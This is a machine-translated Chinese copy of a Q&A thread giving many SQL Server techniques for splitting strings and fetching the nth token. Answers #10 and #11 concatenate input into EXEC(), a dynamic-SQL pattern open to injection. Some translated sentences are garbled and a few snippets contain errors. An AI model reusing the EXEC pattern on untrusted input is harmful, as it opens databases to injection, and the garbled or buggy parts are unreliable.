*   [SQL Server 2016 中的 STRING_SPLIT()：后续 #1](https://sqlperformance.com/2016/04/sql-server-2016/string-split-follow-up-1)
*   [SQL Server 2016 中的 STRING_SPLIT()：后续 #2](https://sqlperformance.com/2016/04/sql-server-2016/string-split-follow-up-2)
*   [SQL Server v.Next：STRING_AGG() 性能](https://sqlperformance.com/2016/12/sql-performance/sql-server-v-next-string_agg-performance)
*   [使用 SQL Server 的新 STRING_AGG 和 STRING_SPLIT 函数解决老问题](https://www.mssqltips.com/sqlservertip/5275/solve-old-problems-with-sql-servers-new-stringagg-and-stringsplit-functions/?utm_source=AaronBertrand)

* * *

## 回答 #5

> 赞同：38
> 
> 时间：2008-10-27T16:48:51.943

您可以利用数字表进行字符串解析。

创建一个物理数字表：

```
 create table dbo.Numbers (N int primary key);
    insert into dbo.Numbers
        select top 1000 row_number() over(order by number) from master..spt_values
    go 
```

创建包含 1000000 行的测试表

```
 create table #yak (i int identity(1,1) primary key, array varchar(50))

    insert into #yak(array)
        select 'a,b,c' from dbo.Numbers n cross join dbo.Numbers nn
    go 
```

创建函数

```
 create function [dbo].[ufn_ParseArray]
        (   @Input      nvarchar(4000), 
            @Delimiter  char(1) = ',',
            @BaseIdent  int
        )
    returns table as
    return  
        (   select  row_number() over (order by n asc) + (@BaseIdent - 1) [i],
                    substring(@Input, n, charindex(@Delimiter, @Input + @Delimiter, n) - n) s
            from    dbo.Numbers
            where   n <= convert(int, len(@Input)) and
                    substring(@Delimiter + @Input, n, 1) = @Delimiter
        )
    go 
```

使用情况（在我的笔记本电脑上 40 秒内输出 300 万行）

```
 select * 
    from #yak 
    cross apply dbo.ufn_ParseArray(array, ',', 1) 
```

清理

```
 drop table dbo.Numbers;
    drop function  [dbo].[ufn_ParseArray] 
```

这里的性能并不惊人，但调用超过一百万行表的函数并不是最好的主意。如果对多行执行字符串拆分，我会避免使用该函数。

* * *

## 回答 #6

> 赞同：37
> 
> 时间：2016-07-08T20:41:19.780

这个问题**不是关于字符串拆分方法**，而是关于**如何获取第 n 个元素**。

`CTE`这里的所有答案都是使用递归、 s、multiple和进行某种字符串拆分`CHARINDEX`，发明函数，调用 CLR 方法，数字表，s ...大多数答案涵盖了许多代码行。`REVERSE``PATINDEX``CROSS APPLY`

但是 - 如果你真的**想要一种获取第 n 个元素的方法**- 这可以作为**真正的 one-liner**来完成，没有 UDF，甚至没有子选择......并且作为一个额外的好处：**输入安全**

获取由空格分隔的第 2 部分：

```
DECLARE @input NVARCHAR(100)=N'part1 part2 part3';
SELECT CAST(N'<x>' + REPLACE(@input,N' ',N'</x><x>') + N'</x>' AS XML).value('/x[2]','nvarchar(max)') 
```

当然，**您可以将变量**用于分隔符和位置（用于`sql:column`直接从查询值中检索位置）：

```
DECLARE @dlmt NVARCHAR(10)=N' ';
DECLARE @pos INT = 2;
SELECT CAST(N'<x>' + REPLACE(@input,@dlmt,N'</x><x>') + N'</x>' AS XML).value('/x[sql:variable("@pos")][1]','nvarchar(max)') 
```

如果您的字符串可能包含**禁止字符**（尤其是其中的一个`&><`），您仍然可以这样做。只需`FOR XML PATH`先在您的字符串上使用，以隐式地用合适的转义序列替换所有禁用字符。

如果-另外-**您的分隔符是分号**，这是一个非常特殊的情况。在这种情况下，我首先将分隔符替换为“#DLMT#”，最后将其替换为 XML 标记：

```
SET @input=N'Some <, > and &;Other äöü@€;One more';
SET @dlmt=N';';
SELECT CAST(N'<x>' + REPLACE((SELECT REPLACE(@input,@dlmt,'#DLMT#') AS [*] FOR XML PATH('')),N'#DLMT#',N'</x><x>') + N'</x>' AS XML).value('/x[sql:variable("@pos")][1]','nvarchar(max)'); 
```

## SQL-Server 2016+ 的更新

遗憾的是，开发人员忘记使用`STRING_SPLIT`. 但是，使用 SQL-Server 2016+，有`JSON_VALUE`和`OPENJSON`.

我们可以将`JSON_VALUE`位置作为索引数组传递。

对于[文档](https://docs.microsoft.com/en-us/sql/t-sql/functions/openjson-transact-sql?view=sql-server-2017)明确说明`OPENJSON`：

> 当 OPENJSON 解析 JSON 数组时，该函数将 JSON 文本中元素的索引作为键返回。

像这样的字符串`1,2,3`只需要括号：`[1,2,3]`.
一串单词 like `this is an example`need to be `["this","is","an","example"]`。
这些是非常简单的字符串操作。试试看：

```
DECLARE @str VARCHAR(100)='Hello John Smith';
DECLARE @position INT = 2;

--We can build the json-path '$[1]' using CONCAT
SELECT JSON_VALUE('["' + REPLACE(@str,' ','","') + '"]',CONCAT('$[',@position-1,']')); 
```

--查看这个位置安全的字符串拆分器（*从零开始*）：

```
SELECT  JsonArray.[key] AS [Position]
       ,JsonArray.[value] AS [Part]
FROM OPENJSON('["' + REPLACE(@str,' ','","') + '"]') JsonArray 
```

在[这篇文章](https://stackoverflow.com/a/56617711/5089204)中，我测试了各种方法，发现`OPENJSON`速度非常快。甚至比著名的“delimitedSplit8k()”方法还要快...

## 更新 2 - 获取类型安全的值

我们可以简单地通过使用 doubled 来*在数组中*`[[]]`使用数组。这允许一个类型化的`WITH`子句：

```
DECLARE  @SomeDelimitedString VARCHAR(100)='part1|1|20190920';

DECLARE @JsonArray NVARCHAR(MAX)=CONCAT('[["',REPLACE(@SomeDelimitedString,'|','","'),'"]]');

SELECT @SomeDelimitedString          AS TheOriginal
      ,@JsonArray                    AS TransformedToJSON
      ,ValuesFromTheArray.*
FROM OPENJSON(@JsonArray)
WITH(TheFirstFragment  VARCHAR(100) '$[0]'
    ,TheSecondFragment INT          '$[1]'
    ,TheThirdFragment  DATE         '$[2]') ValuesFromTheArray 
```

* * *

## 回答 #7

> 赞同：22
> 
> 时间：2008-08-05T18:39:58.007

这是一个可以做到的UDF。它将返回一个分隔值表，尚未尝试所有方案，但您的示例工作正常。

```
 CREATE FUNCTION SplitString 
(
    -- Add the parameters for the function here
    @myString varchar(500),
    @deliminator varchar(10)
)
RETURNS 
@ReturnTable TABLE 
(
    -- Add the column definitions for the TABLE variable here
    [id] [int] IDENTITY(1,1) NOT NULL,
    [part] [varchar](50) NULL
)
AS
BEGIN
        Declare @iSpaces int
        Declare @part varchar(50)

        --initialize spaces
        Select @iSpaces = charindex(@deliminator,@myString,0)
        While @iSpaces > 0

        Begin
            Select @part = substring(@myString,0,charindex(@deliminator,@myString,0))

            Insert Into @ReturnTable(part)
            Select @part

    Select @myString = substring(@mystring,charindex(@deliminator,@myString,0)+ len(@deliminator),len(@myString) - charindex(' ',@myString,0))

            Select @iSpaces = charindex(@deliminator,@myString,0)
        end

        If len(@myString) > 0
            Insert Into @ReturnTable
            Select @myString

    RETURN 
END
GO 
```

你可以这样称呼它：

```
 Select * From SplitString('Hello John Smith',' ') 
```

编辑：更新解决方案来处理 len>1 的定界符，如：

```
 select * From SplitString('Hello**John**Smith','**') 
```

* * *

## 回答 #8

> 赞同：16
> 
> 时间：2013-01-30T09:41:17.203

在这里我发布一个简单的解决方法

```
CREATE FUNCTION [dbo].[split](
          @delimited NVARCHAR(MAX),
          @delimiter NVARCHAR(100)
        ) RETURNS @t TABLE (id INT IDENTITY(1,1), val NVARCHAR(MAX))
        AS
        BEGIN
          DECLARE @xml XML
          SET @xml = N'<t>' + REPLACE(@delimited,@delimiter,'</t><t>') + '</t>'

          INSERT INTO @t(val)
          SELECT  r.value('.','varchar(MAX)') as item
          FROM  @xml.nodes('/t') as records(r)
          RETURN
        END 
```

像这样执行函数

```
 select * from dbo.split('Hello John Smith',' ') 
```

* * *

## 回答 #9

> 赞同：10
> 
> 时间：2012-07-19T21:46:38.117

在我看来，你们把事情弄得太复杂了。只需创建一个 CLR UDF 并完成它。

```
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Collections.Generic;

public partial class UserDefinedFunctions {
  [SqlFunction]
  public static SqlString SearchString(string Search) {
    List<string> SearchWords = new List<string>();
    foreach (string s in Search.Split(new char[] { ' ' })) {
      if (!s.ToLower().Equals("or") && !s.ToLower().Equals("and")) {
        SearchWords.Add(s);
      }
    }

    return new SqlString(string.Join(" OR ", SearchWords.ToArray()));
  }
}; 
```

* * *

## 回答 #10

> 赞同：10
> 
> 时间：2013-03-01T16:26:59.797

使用`string`和`values()`声明呢？

```
DECLARE @str varchar(max)
SET @str = 'Hello John Smith'

DECLARE @separator varchar(max)
SET @separator = ' '

DECLARE @Splited TABLE(id int IDENTITY(1,1), item varchar(max))

SET @str = REPLACE(@str, @separator, '''),(''')
SET @str = 'SELECT * FROM (VALUES(''' + @str + ''')) AS V(A)' 

INSERT INTO @Splited
EXEC(@str)

SELECT * FROM @Splited 
```

达到的结果集。

```
id  item
1   Hello
2   John
3   Smith 
```

* * *

## 回答 #11

> 赞同：9
> 
> 时间：2013-08-13T15:11:27.963

我使用了 frederic 的答案，但这在 SQL Server 2005 中不起作用

我修改了它，我正在使用`select`它`union all`并且它有效

```
DECLARE @str varchar(max)
SET @str = 'Hello John Smith how are you'

DECLARE @separator varchar(max)
SET @separator = ' '

DECLARE @Splited table(id int IDENTITY(1,1), item varchar(max))

SET @str = REPLACE(@str, @separator, ''' UNION ALL SELECT ''')
SET @str = ' SELECT  ''' + @str + '''  ' 

INSERT INTO @Splited
EXEC(@str)

SELECT * FROM @Splited 
```

结果集是：

```
id  item
1   Hello
2   John
3   Smith
4   how
5   are
6   you 
```

* * *

## 回答 #12

> 赞同：8
> 
> 时间：2014-11-11T14:31:37.597

这种模式工作得很好，你可以概括

```
Convert(xml,'<n>'+Replace(FIELD,'.','</n><n>')+'</n>').value('(/n[INDEX])','TYPE')
                          ^^^^^                                   ^^^^^     ^^^^ 
```

注意**字段**、**索引**和**类型**。

让一些带有标识符的表

```
sys.message.1234.warning.A45
sys.message.1235.error.O98
.... 
```

然后，你可以写

```
SELECT Source         = q.value('(/n[1])', 'varchar(10)'),
       RecordType     = q.value('(/n[2])', 'varchar(20)'),
       RecordNumber   = q.value('(/n[3])', 'int'),
       Status         = q.value('(/n[4])', 'varchar(5)')
FROM   (
         SELECT   q = Convert(xml,'<n>'+Replace(fieldName,'.','</n><n>')+'</n>')
         FROM     some_TABLE
       ) Q 
```

拆分和铸造所有零件。

* * *

## 回答 #13

> 赞同：8
> 
> 时间：2016-01-08T14:30:11.620

还有一个通过分隔符函数获得字符串的第 n 部分：

```
create function GetStringPartByDelimeter (
    @value as nvarchar(max),
    @delimeter as nvarchar(max),
    @position as int
) returns NVARCHAR(MAX) 
AS BEGIN
    declare @startPos as int
    declare @endPos as int
    set @endPos = -1
    while (@position > 0 and @endPos != 0) begin
        set @startPos = @endPos + 1
        set @endPos = charindex(@delimeter, @value, @startPos)

        if(@position = 1) begin
            if(@endPos = 0)
                set @endPos = len(@value) + 1

            return substring(@value, @startPos, @endPos - @startPos)
        end

        set @position = @position - 1
    end

    return null
end 
```

和用法：

```
select dbo.GetStringPartByDelimeter ('a;b;c;d;e', ';', 3) 
```

返回：

```
c 
```

* * *

## 回答 #14

> 赞同：7
> 
> 时间：2018-04-05T10:23:24.193

如果您的数据库具有 130 或更高的兼容性级别，那么您可以使用[STRING_SPLIT](https://docs.microsoft.com/en-us/sql/t-sql/functions/string-split-transact-sql)函数和[OFFSET FETCH](https://technet.microsoft.com/en-us/library/gg699618(v=sql.110).aspx)子句按索引获取特定项目。

要获取**索引 N**处的项目（从零开始），您可以使用以下代码

```
SELECT value
FROM STRING_SPLIT('Hello John Smith',' ')
ORDER BY (SELECT NULL)
OFFSET N ROWS
FETCH NEXT 1 ROWS ONLY 
```

要检查[数据库的兼容性级别，请](https://docs.microsoft.com/en-us/sql/relational-databases/databases/view-or-change-the-compatibility-level-of-a-database)执行以下代码：

```
SELECT compatibility_level  
FROM sys.databases WHERE name = 'YourDBName'; 
```

* * *

## 回答 #15

> 赞同：6
> 
> 时间：2011-11-20T06:40:26.403

我在网上寻找解决方案，以下对我有用。 [参考](http://code.developwithus.com/topics/database/mssql/)。

你这样调用函数：

```
SELECT * FROM dbo.split('ram shyam hari gopal',' ') 
```

* * *

```
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE FUNCTION [dbo].[Split](@String VARCHAR(8000), @Delimiter CHAR(1))       
RETURNS @temptable TABLE (items VARCHAR(8000))       
AS       
BEGIN       
    DECLARE @idx INT       
    DECLARE @slice VARCHAR(8000)        
    SELECT @idx = 1       
    IF len(@String)<1 OR @String IS NULL  RETURN       
    WHILE @idx!= 0       
    BEGIN       
        SET @idx = charindex(@Delimiter,@String)       
        IF @idx!=0       
            SET @slice = LEFT(@String,@idx - 1)       
        ELSE       
            SET @slice = @String       
        IF(len(@slice)>0)  
            INSERT INTO @temptable(Items) VALUES(@slice)       
        SET @String = RIGHT(@String,len(@String) - @idx)       
        IF len(@String) = 0 break       
    END   
    RETURN       
END 
```

* * *

## 回答 #16

> 赞同：5
> 
> 时间：2008-08-05T18:41:34.367

试试这个：

```
CREATE function [SplitWordList]
(
 @list varchar(8000)
)
returns @t table 
(
 Word varchar(50) not null,
 Position int identity(1,1) not null
)
as begin
  declare 
    @pos int,
    @lpos int,
    @item varchar(100),
    @ignore varchar(100),
    @dl int,
    @a1 int,
    @a2 int,
    @z1 int,
    @z2 int,
    @n1 int,
    @n2 int,
    @c varchar(1),
    @a smallint
  select 
    @a1 = ascii('a'),
    @a2 = ascii('A'),
    @z1 = ascii('z'),
    @z2 = ascii('Z'),
    @n1 = ascii('0'),
    @n2 = ascii('9')
  set @ignore = '''"'
  set @pos = 1
  set @dl = datalength(@list)
  set @lpos = 1
  set @item = ''
  while (@pos <= @dl) begin
    set @c = substring(@list, @pos, 1)
    if (@ignore not like '%' + @c + '%') begin
      set @a = ascii(@c)
      if ((@a >= @a1) and (@a <= @z1))  
        or ((@a >= @a2) and (@a <= @z2))
        or ((@a >= @n1) and (@a <= @n2))
      begin
        set @item = @item + @c
      end else if (@item > '') begin
        insert into @t values (@item)
        set @item = ''
      end
    end 
    set @pos = @pos + 1
  end
  if (@item > '') begin
    insert into @t values (@item)
  end
  return
end 
```

像这样测试它：

```
select * from SplitWordList('Hello John Smith') 
```

* * *

## 回答 #17

> 赞同：5
> 
> 时间：2013-03-14T10:18:50.557

以下示例使用递归 CTE

**更新**18.09.2013

```
CREATE FUNCTION dbo.SplitStrings_CTE(@List nvarchar(max), @Delimiter nvarchar(1))
RETURNS @returns TABLE (val nvarchar(max), [level] int, PRIMARY KEY CLUSTERED([level]))
AS
BEGIN
;WITH cte AS
 (
  SELECT SUBSTRING(@List, 0, CHARINDEX(@Delimiter,  @List + @Delimiter)) AS val,
         CAST(STUFF(@List + @Delimiter, 1, CHARINDEX(@Delimiter, @List + @Delimiter), '') AS nvarchar(max)) AS stval, 
         1 AS [level]
  UNION ALL
  SELECT SUBSTRING(stval, 0, CHARINDEX(@Delimiter, stval)),
         CAST(STUFF(stval, 1, CHARINDEX(@Delimiter, stval), '') AS nvarchar(max)),
         [level] + 1
  FROM cte
  WHERE stval != ''
  )
  INSERT @returns
  SELECT REPLACE(val, ' ','' ) AS val, [level]
  FROM cte
  WHERE val > ''
  RETURN
END 
```

[**SQLFiddle**](http://sqlfiddle.com/#!3/c43e0/1)上的演示[](http://sqlfiddle.com/#!3/c43e0/1)

 *** * *

## 回答 #18

> 赞同：2
> 
> 时间：2013-11-05T00:12:17.067

```
 Alter Function dbo.fn_Split
    (
    @Expression nvarchar(max),
    @Delimiter  nvarchar(20) = ',',
    @Qualifier  char(1) = Null
    )
    RETURNS @Results TABLE (id int IDENTITY(1,1), value nvarchar(max))
    AS
    BEGIN
       /* USAGE
            Select * From dbo.fn_Split('apple pear grape banana orange honeydew cantalope 3 2 1 4', ' ', Null)
            Select * From dbo.fn_Split('1,abc,"Doe, John",4', ',', '"')
            Select * From dbo.fn_Split('Hello 0,"&""&&&&', ',', '"')
       */

       -- Declare Variables
       DECLARE
          @X     xml,
          @Temp  nvarchar(max),
          @Temp2 nvarchar(max),
          @Start int,
          @End   int

       -- HTML Encode @Expression
       Select @Expression = (Select @Expression For XML Path(''))

       -- Find all occurences of @Delimiter within @Qualifier and replace with |||***|||
       While PATINDEX('%' + @Qualifier + '%', @Expression) > 0 AND Len(IsNull(@Qualifier, '')) > 0
       BEGIN
          Select
             -- Starting character position of @Qualifier
             @Start = PATINDEX('%' + @Qualifier + '%', @Expression),
             -- @Expression starting at the @Start position
             @Temp = SubString(@Expression, @Start + 1, LEN(@Expression)-@Start+1),
             -- Next position of @Qualifier within @Expression
             @End = PATINDEX('%' + @Qualifier + '%', @Temp) - 1,
             -- The part of Expression found between the @Qualifiers
             @Temp2 = Case When @End < 0 Then @Temp Else Left(@Temp, @End) End,
             -- New @Expression
             @Expression = REPLACE(@Expression,
                                   @Qualifier + @Temp2 + Case When @End < 0 Then '' Else @Qualifier End,
                                   Replace(@Temp2, @Delimiter, '|||***|||')
                           )
       END

       -- Replace all occurences of @Delimiter within @Expression with '</fn_Split><fn_Split>'
       -- And convert it to XML so we can select from it
       SET
          @X = Cast('<fn_Split>' +
                    Replace(@Expression, @Delimiter, '</fn_Split><fn_Split>') +
                    '</fn_Split>' as xml)

       -- Insert into our returnable table replacing '|||***|||' back to @Delimiter
       INSERT @Results
       SELECT
          "Value" = LTRIM(RTrim(Replace(C.value('.', 'nvarchar(max)'), '|||***|||', @Delimiter)))
       FROM
          @X.nodes('fn_Split') as X(C)

       -- Return our temp table
       RETURN
    END 
```

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2015-10-23T10:07:55.507

您可以在不需要函数的情况下在 SQL 中拆分字符串：

```
DECLARE @bla varchar(MAX)
SET @bla = 'BED40DFC-F468-46DD-8017-00EF2FA3E4A4,64B59FC5-3F4D-4B0E-9A48-01F3D4F220B0,A611A108-97CA-42F3-A2E1-057165339719,E72D95EA-578F-45FC-88E5-075F66FD726C'

-- http://stackoverflow.com/questions/14712864/how-to-query-values-from-xml-nodes
SELECT 
    x.XmlCol.value('.', 'varchar(36)') AS val 
FROM 
(
    SELECT 
    CAST('<e>' + REPLACE(@bla, ',', '</e><e>') + '</e>' AS xml) AS RawXml
) AS b 
CROSS APPLY b.RawXml.nodes('e') x(XmlCol); 
```

如果需要支持任意字符串（带有xml特殊字符）

```
DECLARE @bla NVARCHAR(MAX)
SET @bla = '<html>unsafe & safe Utf8CharsDon''tGetEncoded ÄöÜ - "Conex"<html>,Barnes & Noble,abc,def,ghi'

-- http://stackoverflow.com/questions/14712864/how-to-query-values-from-xml-nodes
SELECT 
    x.XmlCol.value('.', 'nvarchar(MAX)') AS val 
FROM 
(
    SELECT 
    CAST('<e>' + REPLACE((SELECT @bla FOR XML PATH('')), ',', '</e><e>') + '</e>' AS xml) AS RawXml
) AS b 
CROSS APPLY b.RawXml.nodes('e') x(XmlCol); 
```

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2013-01-24T06:43:52.693

我知道这是一个老问题，但我认为有人可以从我的解决方案中受益。

```
select 
SUBSTRING(column_name,1,CHARINDEX(' ',column_name,1)-1)
,SUBSTRING(SUBSTRING(column_name,CHARINDEX(' ',column_name,1)+1,LEN(column_name))
    ,1
    ,CHARINDEX(' ',SUBSTRING(column_name,CHARINDEX(' ',column_name,1)+1,LEN(column_name)),1)-1)
,SUBSTRING(SUBSTRING(column_name,CHARINDEX(' ',column_name,1)+1,LEN(column_name))
    ,CHARINDEX(' ',SUBSTRING(column_name,CHARINDEX(' ',column_name,1)+1,LEN(column_name)),1)+1
    ,LEN(column_name))
from table_name 
```

**[SQL 小提琴](http://www.sqlfiddle.com/#!3/776f3/1)**

**好处：**

*   它用 ' ' 分隔所有 3 个子字符串分隔符。
*   不得使用 while 循环，因为它会降低性能。
*   无需旋转，因为所有生成的子字符串都将显示在一行中

**限制：**

*   必须知道总数。空格（子字符串）。

**注意**：该解决方案最多可以提供 N 个子字符串。

为了克服限制，我们可以使用以下[**ref**](https://stackoverflow.com/questions/14101227/how-to-use-pivot-in-a-recursive-stored-procedure/14101790#14101790)。

但同样，上述[**解决方案**](https://stackoverflow.com/questions/14101227/how-to-use-pivot-in-a-recursive-stored-procedure/14101790#14101790)不能在表格中使用（实际上我无法使用它）。

我再次希望这个解决方案可以帮助某人。

**更新：**如果 Records > 50000 不**建议**使用**`LOOPS`**，因为它会降低**性能**

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2014-08-26T16:50:04.223

几乎所有其他答案都在替换正在拆分的字符串，这会浪费 CPU 周期并执行不必要的内存分配。

我在这里介绍了一种更好的字符串拆分方法：[http ://www.digitalruby.com/split-string-sql-server/](http://www.digitalruby.com/split-string-sql-server/)

这是代码：

```
SET NOCOUNT ON

-- You will want to change nvarchar(MAX) to nvarchar(50), varchar(50) or whatever matches exactly with the string column you will be searching against
DECLARE @SplitStringTable TABLE (Value nvarchar(MAX) NOT NULL)
DECLARE @StringToSplit nvarchar(MAX) = 'your|string|to|split|here'
DECLARE @SplitEndPos int
DECLARE @SplitValue nvarchar(MAX)
DECLARE @SplitDelim nvarchar(1) = '|'
DECLARE @SplitStartPos int = 1

SET @SplitEndPos = CHARINDEX(@SplitDelim, @StringToSplit, @SplitStartPos)

WHILE @SplitEndPos > 0
BEGIN
    SET @SplitValue = SUBSTRING(@StringToSplit, @SplitStartPos, (@SplitEndPos - @SplitStartPos))
    INSERT @SplitStringTable (Value) VALUES (@SplitValue)
    SET @SplitStartPos = @SplitEndPos + 1
    SET @SplitEndPos = CHARINDEX(@SplitDelim, @StringToSplit, @SplitStartPos)
END

SET @SplitValue = SUBSTRING(@StringToSplit, @SplitStartPos, 2147483647)
INSERT @SplitStringTable (Value) VALUES(@SplitValue)

SET NOCOUNT OFF

-- You can select or join with the values in @SplitStringTable at this point. 
```

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2015-01-13T06:37:07.267

`TVF`使用with recursive的纯基于集合的解决方案`CTE`。您可以`JOIN`将此`APPLY`函数应用于任何数据集。

```
create function [dbo].[SplitStringToResultSet] (@value varchar(max), @separator char(1))
returns table
as return
with r as (
    select value, cast(null as varchar(max)) [x], -1 [no] from (select rtrim(cast(@value as varchar(max))) [value]) as j
    union all
    select right(value, len(value)-case charindex(@separator, value) when 0 then len(value) else charindex(@separator, value) end) [value]
    , left(r.[value], case charindex(@separator, r.value) when 0 then len(r.value) else abs(charindex(@separator, r.[value])-1) end ) [x]
    , [no] + 1 [no]
    from r where value > '')

select ltrim(x) [value], [no] [index] from r where x is not null;
go 
```

用法：

```
select *
from [dbo].[SplitStringToResultSet]('Hello John Smith', ' ')
where [index] = 1; 
```

结果：

```
value   index
-------------
John    1 
```

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2021-12-02T09:25:43.817

在 Azure SQL 数据库（基于 Microsoft SQL Server 但不完全相同）中，`STRING_SPLIT`函数的签名如下所示：

```
STRING_SPLIT ( string , separator [ , enable_ordinal ] ) 
```

当`enable_ordinal`flag 设置为 1 时，结果将包括一个名为的列，该列`ordinal`由输入字符串中子字符串的从 1 开始的位置组成：

```
SELECT *
FROM STRING_SPLIT('hello john smith', ' ', 1)

| value | ordinal |
|-------|---------|
| hello | 1       |
| john  | 2       |
| smith | 3       | 
```

这允许我们这样做：

```
SELECT value
FROM STRING_SPLIT('hello john smith', ' ', 1)
WHERE ordinal = 2

| value |
|-------|
| john  | 
```

* * *

如果`enable_ordinal`不可用，则有一个技巧***，它假定输入字符串的子字符串是唯一的***。在这种情况下，`CHAR_INDEX`可用于查找输入字符串中子字符串的位置：

```
SELECT value, ROW_NUMBER() OVER (ORDER BY CHARINDEX(value, input_str)) AS ord_pos
FROM (VALUES
    ('hello john smith')
) AS x(input_str)
CROSS APPLY STRING_SPLIT(input_str, ' ')

| value | ord_pos |
|-------+---------|
| hello | 1       |
| john  | 2       |
| smith | 3       | 
```

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2014-01-16T10:38:04.663

具有服务器痛苦的递归 CTE 解决方案，[测试它](http://sqlfiddle.com/#!3/9ebaa/1)

**MS SQL Server 2008 架构设置**：

```
create table Course( Courses varchar(100) );
insert into Course values ('Hello John Smith'); 
```

**查询 1**：

```
with cte as
   ( select 
        left( Courses, charindex( ' ' , Courses) ) as a_l,
        cast( substring( Courses, 
                         charindex( ' ' , Courses) + 1 , 
                         len(Courses ) ) + ' ' 
              as varchar(100) )  as a_r,
        Courses as a,
        0 as n
     from Course t
    union all
      select 
        left(a_r, charindex( ' ' , a_r) ) as a_l,
        substring( a_r, charindex( ' ' , a_r) + 1 , len(a_R ) ) as a_r,
        cte.a,
        cte.n + 1 as n
    from Course t inner join cte 
         on t.Courses = cte.a and len( a_r ) > 0

   )
select a_l, n from cte
--where N = 1 
```

**[结果](http://sqlfiddle.com/#!3/9ebaa/1/0)**：

```
|    A_L | N |
|--------|---|
| Hello  | 0 |
|  John  | 1 |
| Smith  | 2 | 
```

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2014-12-08T03:59:24.633

虽然类似于 josejuan 的基于 xml 的答案，但我发现只处理一次 xml 路径，然后进行旋转会更有效：

```
select ID,
    [3] as PathProvidingID,
    [4] as PathProvider,
    [5] as ComponentProvidingID,
    [6] as ComponentProviding,
    [7] as InputRecievingID,
    [8] as InputRecieving,
    [9] as RowsPassed,
    [10] as InputRecieving2
    from
    (
    select id,message,d.* from sysssislog cross apply       ( 
          SELECT Item = y.i.value('(./text())[1]', 'varchar(200)'),
              row_number() over(order by y.i) as rn
          FROM 
          ( 
             SELECT x = CONVERT(XML, '<i>' + REPLACE(Message, ':', '</i><i>') + '</i>').query('.')
          ) AS a CROSS APPLY x.nodes('i') AS y(i)
       ) d
       WHERE event
       = 
       'OnPipelineRowsSent'
    ) as tokens 
    pivot 
    ( max(item) for [rn] in ([3],[4],[5],[6],[7],[8],[9],[10]) 
    ) as data 
```

8点30分跑

```
select id,
tokens.value('(/n[3])', 'varchar(100)')as PathProvidingID,
tokens.value('(/n[4])', 'varchar(100)') as PathProvider,
tokens.value('(/n[5])', 'varchar(100)') as ComponentProvidingID,
tokens.value('(/n[6])', 'varchar(100)') as ComponentProviding,
tokens.value('(/n[7])', 'varchar(100)') as InputRecievingID,
tokens.value('(/n[8])', 'varchar(100)') as InputRecieving,
tokens.value('(/n[9])', 'varchar(100)') as RowsPassed
 from
(
    select id, Convert(xml,'<n>'+Replace(message,'.','</n><n>')+'</n>') tokens
         from sysssislog 
       WHERE event
       = 
       'OnPipelineRowsSent'
    ) as data 
```

9点20分跑

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2014-12-20T11:58:36.940

```
CREATE FUNCTION [dbo].[fnSplitString] 
( 
    @string NVARCHAR(MAX), 
    @delimiter CHAR(1) 
) 
RETURNS @output TABLE(splitdata NVARCHAR(MAX) 
) 
BEGIN 
    DECLARE @start INT, @end INT 
    SELECT @start = 1, @end = CHARINDEX(@delimiter, @string) 
    WHILE @start < LEN(@string) + 1 BEGIN 
        IF @end = 0  
            SET @end = LEN(@string) + 1

        INSERT INTO @output (splitdata)  
        VALUES(SUBSTRING(@string, @start, @end - @start)) 
        SET @start = @end + 1 
        SET @end = CHARINDEX(@delimiter, @string, @start)

    END 
    RETURN 
END 
```

并使用它

```
select *from dbo.fnSplitString('Querying SQL Server','') 
```

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2015-02-13T09:14:22.343

**如果有人只想获得分隔文本的一部分，可以使用它**

select * from fromSplitStringSep('Word1 wordr2 word3',' ')

```
CREATE function [dbo].[SplitStringSep] 
(
    @str nvarchar(4000), 
    @separator char(1)
)
returns table
AS
return (
    with tokens(p, a, b) AS (
        select 
        1, 
        1, 
        charindex(@separator, @str)
        union all
        select
            p + 1, 
            b + 1, 
            charindex(@separator, @str, b + 1)
        from tokens
        where b > 0
        )
        select
            p-1 zeroBasedOccurance,
            substring(
                @str, 
                a, 
                case when b > 0 then b-a ELSE 4000 end) 
            AS s
        from tokens
  ) 
```

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2015-10-15T10:50:09.183

我开发了这个，

```
declare @x nvarchar(Max) = 'ali.veli.deli.';
declare @item nvarchar(Max);
declare @splitter char='.';

while CHARINDEX(@splitter,@x) != 0
begin
    set @item = LEFT(@x,CHARINDEX(@splitter,@x))
    set @x    = RIGHT(@x,len(@x)-len(@item) )
     select @item as item, @x as x;
end 
```

你唯一应该注意的是点“。” @x 的那一端总是应该在那里。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2016-07-14T05:29:41.670

```
declare @strng varchar(max)='hello john smith'
select (
    substring(
        @strng,
        charindex(' ', @strng) + 1,
        (
          (charindex(' ', @strng, charindex(' ', @strng) + 1))
          - charindex(' ',@strng)
        )
    )) 
```

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2016-10-31T14:18:19.980

在@NothingsImpossible 解决方案的基础上，或者更确切地说，评论投票最多的答案（略低于接受的答案），我发现以下**快速而简单的**解决方案满足了我自己的需求 - 它具有仅在 SQL 域内的好处。

给定一个字符串“第一；第二；第三；第四；第五”，比如说，我想获得第三个令牌。这只有在我们知道字符串将有多少个标记时才有效 - 在这种情况下它是 5。所以我的行动方式是将最后两个标记切掉（内部查询），然后将前两个标记切掉（外部查询）

我知道这很丑陋并且涵盖了我所处的特定条件，但我发布它以防万一有人发现它有用。干杯

```
select 
    REVERSE(
        SUBSTRING(
            reverse_substring, 
            0, 
            CHARINDEX(';', reverse_substring)
        )
    ) 
from 
(
    select 
        msg,
        SUBSTRING(
            REVERSE(msg), 
            CHARINDEX(
                ';', 
                REVERSE(msg), 
                CHARINDEX(
                    ';',
                    REVERSE(msg)
                )+1
            )+1,
            1000
        ) reverse_substring
    from 
    (
        select 'first;second;third;fourth;fifth' msg
    ) a
) b 
```

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2017-09-04T21:52:57.943

